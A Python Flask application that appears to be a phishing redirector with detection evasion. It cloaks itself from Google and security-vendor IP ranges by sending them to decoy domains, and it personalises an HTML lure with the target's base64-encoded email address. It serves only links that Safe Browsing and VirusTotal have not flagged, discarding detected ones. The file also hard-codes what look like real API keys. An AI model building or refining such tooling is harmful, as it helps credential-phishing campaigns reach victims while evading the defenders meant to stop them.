from flask import Flask, request, redirect, send_file, jsonify
import requests
import random
import base64
import os
import re  # For email validation
import time  # For sleep function
import asyncio
import aiohttp

app = Flask(__name__)

# Your Google Safe Browsing API key
API_KEY = 'AIzaSyDyOPmvplb1WtijK21xb4ApvRZwCxtsA18'
# Your VirusTotal API key
VIRUSTOTAL_API_KEY = '544adecd665fb45c6b4e80d64c5f2c3168366a72b629f9e6929d6d6863f7c833'
# Path to the txt file with the links
LINKS_FILE_PATH = 'links.txt'
# Path to the raw HTML template
RAW_HTML_FILE_PATH = 'raw.html'
# Path to the final index HTML file
INDEX_HTML_FILE_PATH = 'index.html'
# Path to the file containing redirect URLs
REDIRECT_URLS_FILE_PATH = 'redirecturls.txt'


# Function to check if a URL is safe with Google Safe Browsing
def check_url_safety(api_key, url):
    api_url = "https://safebrowsing.googleapis.com/v4/threatMatches:find"
    payload = {
        "client": {
            "clientId": "yourcompanyname",
            "clientVersion": "1.5.2"
        },
        "threatInfo": {
            "threatTypes": [
                "MALWARE", 
                "SOCIAL_ENGINEERING", 
                "UNWANTED_SOFTWARE", 
                "PHISHING", 
                "RANSOMWARE", 
                "SPYWARE", 
                "ADWARE", 
                "DENIAL_OF_SERVICE", 
                "SQL_INJECTION", 
                "MITM", 
                "ZERO_DAY_EXPLOIT", 
                "PASSWORD_ATTACK"
            ],
            "platformTypes": ["ANY_PLATFORM"],
            "threatEntryTypes": ["URL"],
            "threatEntries": [
                {"url": url}
            ]
        }
    }
    params = {'key': api_key}
    response = requests.post(api_url, json=payload, params=params)
    result = response.json()

    # If any matches are found, the URL is considered deceptive
    return "matches" not in result




# Function to read links from the txt file
def get_links(file_path):
    with open(file_path, 'r') as file:
        # Filter links to include only those that start with 'https://'
        return [line.strip() for line in file.readlines() if line.strip().startswith('https://')]


# Function to update the raw HTML file with the Base64-encoded safe link
def update_html_with_av_pv_and_link(raw_html_file, index_html_file, iav, ipv, safe_link):
    # Ensure the link includes a protocol (http:// or https://)
    if not safe_link.startswith('http://') and not safe_link.startswith('https://'):
        safe_link = 'https://' + safe_link  # Default to https if no protocol is provided

    # Convert the safe link to Base64
    safe_link_base64 = base64.b64encode(safe_link.encode()).decode()

    with open(raw_html_file, 'r') as raw_file:
        raw_html = raw_file.read()
    
    updated_html = raw_html.replace("[[av]]", iav).replace("[[pv]]", ipv).replace("[[link]]", safe_link_base64)
    
    # Write to index.html (overwrites the existing file if present)
    with open(index_html_file, 'w') as index_file:
        index_file.write(updated_html)


# Function to get the list of blocked IPs from a file
def get_blocked_ips(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]


# Function to get a random redirect URL from the file
def get_random_redirect_url(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]
    return random.choice(urls) if urls else None


def is_valid_email(email):
    # Simple regex to validate email format
    email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(email_regex, email) is not None


bannedIP = [
    r"^66\.102\..*", r"^38\.100\..*", r"^107\.170\..*", r"^149\.20\..*", r"^38\.105\..*",
    r"^74\.125\..*", r"^66\.150\.14\..*", r"^54\.176\..*", r"^184\.173\..*", r"^66\.249\..*",
    r"^128\.242\..*", r"^72\.14\.192\..*", r"^208\.65\.144\..*", r"^209\.85\.128\..*",
    r"^216\.239\.32\..*", r"^207\.126\.144\..*", r"^173\.194\..*", r"^64\.233\.160\..*",
    r"^194\.52\.68\..*", r"^194\.72\.238\..*", r"^62\.116\.207\..*", r"^212\.50\.193\..*",
    r"^69\.65\..*", r"^50\.7\..*", r"^131\.212\..*", r"^46\.116\..*", r"^62\.90\..*",
    r"^89\.138\..*", r"^82\.166\..*", r"^85\.64\..*", r"^93\.172\..*", r"^109\.186\..*",
    r"^194\.90\..*", r"^212\.29\.192\..*", r"^212\.235\..*", r"^217\.132\..*", r"^50\.97\..*",
    r"^209\.85\..*", r"^66\.205\.64\..*", r"^204\.14\.48\..*", r"^64\.27\.2\..*", r"^67\.15\..*",
    r"^202\.108\.252\..*", r"^193\.47\.80\..*", r"^64\.62\.136\..*", r"^66\.221\..*",
    r"^198\.54\..*", r"^192\.115\.134\..*", r"^216\.252\.167\..*", r"^193\.253\.199\..*",
    r"^69\.61\.12\..*", r"^64\.37\.103\..*", r"^38\.144\.36\..*", r"^64\.124\.14\..*",
    r"^206\.28\.72\..*", r"^209\.73\.228\..*", r"^158\.108\..*", r"^168\.188\..*",
    r"^66\.207\.120\..*", r"^167\.24\..*", r"^192\.118\.48\..*", r"^67\.209\.128\..*",
    r"^12\.148\.209\..*", r"^198\.25\..*", r"^64\.106\.213\..*"
]

# Function to check if the incoming IP matches any banned IP pattern
def is_ip_banned(ip):
    for pattern in bannedIP:
        if re.match(pattern, ip):
            return True
    return False

@app.before_request
def block_ip():
    # Get the client IP address from X-Forwarded-For or fallback to remote_addr
    if request.headers.getlist("X-Forwarded-For"):
        # Split the 'X-Forwarded-For' string to extract the first IP address
        requester_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        requester_ip = request.remote_addr

    # Check if the requester's IP is in the blocked IP ranges
    if is_ip_banned(requester_ip):
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)


@app.route('/')
def check_links_and_serve():
    # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
    trexxcoz = request.args.get('trexxcoz')
    coztrexx = request.args.get('coztrexx')

    if not trexxcoz or not coztrexx:
        # If parameters are missing, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # Decode Base64 parameters to string
    try:
        ipv = base64.b64decode(trexxcoz).decode('utf-8')
        iav = base64.b64decode(coztrexx).decode('utf-8')
    except Exception as e:
        # If decoding fails, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # Construct the email address from the decoded parameters
    vmail = f"{iav}@{ipv}"

    # Validate the constructed email
    if not is_valid_email(vmail):
        # If the email is not valid, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # If the email is valid, proceed to check the safe links
    links = get_links(LINKS_FILE_PATH)

    # Loop through the links and check their safety
    for link in links:
        if check_url_safety(API_KEY, link):
            # If a safe link is found, update the HTML with the Base64-encoded link and serve it
            update_html_with_av_pv_and_link(RAW_HTML_FILE_PATH, INDEX_HTML_FILE_PATH, iav, ipv, link)
            return send_file(INDEX_HTML_FILE_PATH)
        else:
            # Remove the unsafe link and continue with the next one
            links.remove(link)

    return "No safe links found!"


file_path = 'links.txt'

async def check_url_with_virustotal(api_key, url):
    async with aiohttp.ClientSession() as session:
        # Submit the URL for scanning
        scan_url = 'https://www.virustotal.com/vtapi/v2/url/scan'
        scan_params = {'apikey': api_key, 'url': url}
        
        async with session.post(scan_url, data=scan_params) as scan_response:
            scan_data = await scan_response.json()

        if scan_data['response_code'] == 1:
            scan_id = scan_data['scan_id']
            # Wait for a few seconds to allow the scan to complete
            await asyncio.sleep(22)

            # Retrieve the scan report using the scan ID
            report_url = 'https://www.virustotal.com/vtapi/v2/url/report'
            report_params = {'apikey': api_key, 'resource': scan_id}
            
            async with session.get(report_url, params=report_params) as report_response:
                report_data = await report_response.json()

            if report_data['response_code'] == 1:
                positives = report_data['positives']
                total = report_data['total']
                permalink = report_data['permalink']
                scans = report_data.get('scans', {})
                return positives, total, permalink, scans
            else:
                return None, None, None, None  # Report not ready yet
        else:
            return None, None, None, None  # Failed to queue URL for scanning

def get_first_https_link(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            url = line.strip()
            if url.startswith('https'):
                return url
    return None

def remove_link_from_file(file_path, link_to_remove):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip() != link_to_remove:
                file.write(line)

@app.route('/check_with_VirusTotal', methods=['GET'])
async def check_with_virustotal():
    # Get the first https link
    url_to_scan = get_first_https_link(file_path)

    if url_to_scan:
        print(f"Scanning URL: {url_to_scan}")

        # Asynchronously check URL with VirusTotal
        positives, total, permalink, scans = await check_url_with_virustotal(VIRUSTOTAL_API_KEY, url_to_scan)

        if positives is not None:
            print(f"URL: {url_to_scan}")
            print(f"Positives: {positives}/{total}")
            print(f"Detailed Report: {permalink}")

            # Check the scan results for specific engines
            trustwave_result = scans.get('Trustwave', {})
            trustwave_detected = trustwave_result.get('detected', False)

            # Flag if any other engine detects a positive result
            other_detected = any(result.get('detected', False) for engine, result in scans.items() if engine != 'Trustwave')

            # If other engines detected a positive, remove the link from the file
            if other_detected:
                print(f"Other engines detected a threat. Removing {url_to_scan} from the file.")
                remove_link_from_file(file_path, url_to_scan)
            else:
                if trustwave_detected:
                    print("Trustwave detected this URL as malicious, but no other engines flagged it. Keeping the link.")
                else:
                    print("No engines detected any issues with this URL.")
        else:
            print("Error retrieving scan results.")
    else:
        print("No https URL found in the file.")

    return jsonify({"message": "Check complete."}), 200


@app.route('/update_links', methods=['POST'])
def update_links():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    # Read the file and append new links to links.txt
    new_links = file.read().decode('utf-8').strip().splitlines()
    
    existing_links = set()
    if os.path.exists(LINKS_FILE_PATH):
        with open(LINKS_FILE_PATH, 'r') as links_file:
            existing_links = set(links_file.read().splitlines())

    new_links_count = 0
    with open(LINKS_FILE_PATH, 'a') as links_file:
        for link in new_links:
            if link and link not in existing_links:
                links_file.write(link + '\n')
                new_links_count += 1

    # Count total links in links.txt
    total_links_count = len(existing_links) + new_links_count

    return jsonify({
        "message": "Links updated successfully!",
        "new_links_count": new_links_count,
        "total_links_count": total_links_count
    }), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
